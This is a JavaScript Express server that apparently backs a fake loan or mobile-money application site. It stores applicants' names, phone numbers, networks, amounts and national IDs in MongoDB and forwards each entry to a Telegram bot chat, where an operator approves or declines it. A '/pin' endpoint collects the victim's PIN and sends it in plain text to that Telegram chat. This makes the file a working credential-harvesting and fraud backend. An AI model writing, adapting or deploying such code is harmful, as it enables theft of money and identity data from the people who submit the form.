const express = require("express");
const axios = require("axios");
const path = require("path");
const mongoose = require("mongoose");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true}));
app.use(express.static(__dirname));

// ENV
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const MONGO_URI = process.env.MONGO_URI;

// ================= CONNECT DB =================
mongoose.connect(MONGO_URI)
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.log(err));

// ================= MODEL =================
const userSchema = new mongoose.Schema({
  name: String,
  phone: { type: String, unique: true },
  network: String,
  amount: String,
  nationalId: String,
  status: { type: String, default: "pending" }
});

const User = mongoose.model("User", userSchema);

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).json({ success: false });
  }

  try {
    await User.findOneAndUpdate(
      { phone },
      { name, phone, network, amount, nationalId, status: "pending" },
      { upsert: true, new: true }
    );

    const message = `
📥 NEW APPLICATION

👤 ${name}
📱 ${phone}
📡 ${network}
💰 ${amount}
🆔 ${nationalId}

Choose action:
`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [[
          { text: "✅ Approve", callback_data: `approve_${phone}` },
          { text: "❌ Decline", callback_data: `decline_${phone}` }
        ]]
      }
    });

    res.json({ success: true, phone });

  } catch (err) {
    console.log(err.message);
    res.status(500).json({ success: false });
  }
});

// ================= STATUS =================
app.get("/status/:phone", async (req, res) => {
  const user = await User.findOne({ phone: req.params.phone });

  if (!user) {
    return res.json({ status: "pending" });
  }

  res.json({ status: user.status });
});

// ================= WEBHOOK =================
app.post("/webhook", async (req, res) => {
  try {
    if (!req.body.callback_query) return res.sendStatus(200);

    const action = req.body.callback_query.data;
    const phone = action.split("_")[1];

    const status = action.startsWith("approve")
      ? "approved"
      : "declined";

    await User.findOneAndUpdate(
      { phone },
      { status }
    );

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `Status updated: ${phone} → ${status}`
    });

    res.sendStatus(200);

  } catch (err) {
    console.log(err.message);
    res.sendStatus(200);
  }
});

// ================= PIN STEP =================
app.post("/pin-step", async (req, res) => {
  const { phone } = req.body;

  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: `📍 PIN STEP\n📱 ${phone}`
  });

  res.sendStatus(200);
});

// ================= PIN =================
app.post("/pin", async (req, res) => {
  const { phone, pin } = req.body;

  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: `🔐 PIN: ${pin}\n📱 ${phone}`
  });

  res.sendStatus(200);
});

// ================= START =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
